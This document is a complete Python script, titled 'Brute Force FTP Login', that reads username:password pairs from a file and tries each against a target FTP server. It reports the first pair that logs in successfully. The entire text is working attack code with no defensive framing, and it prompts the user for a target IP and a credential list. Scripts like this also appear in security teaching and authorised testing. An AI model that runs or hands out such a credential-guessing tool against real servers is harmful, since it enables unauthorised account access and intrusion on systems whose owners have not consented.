# ! Brute Force FTP Login

import ftplib
from termcolor import colored as clrd #Import color text to the output, not neccessary but helps easily seeing the data


def bruteLogin(ip_address, loginfile): #hostname or ip address and the file to use
    try:
        pfile = open(loginfile, "r")
        for line in pfile.readlines():
            userName = line.split(":")[0]
            pswd = line.split(":")[1].strip("\n")
            print (clrd(f"[@] Trying {userName}:{pswd}.", "blue"))
            try:
                ftp = ftplib.FTP(ip_address)
                ftp.login(userName, pswd)
                print (clrd(f"[+] {userName}:{pswd} FTP Login Succeeded.", "green"))
                pfile.close()
                ftp.quit()
                return(userName, pswd) #So it doesn't print the not in list if successful
            except Exception as e:
                #print (clrd(f"[-] {userName}:{pswd} FTP Login Failed.", "red"))
                pass
        print (clrd(f"[-] Username / Password Combination not in list.", "red"))
    except:
        print (clrd(f"[!] The file {loginfile} doesn't exist!", "red"))

ip = input("[*] Enter Target IP: ")
loginfile = input("[*] Enter User:Pass File Path: ")

def main():
    bruteLogin(ip, loginfile)
    
if __name__ == "__main__":
    main()
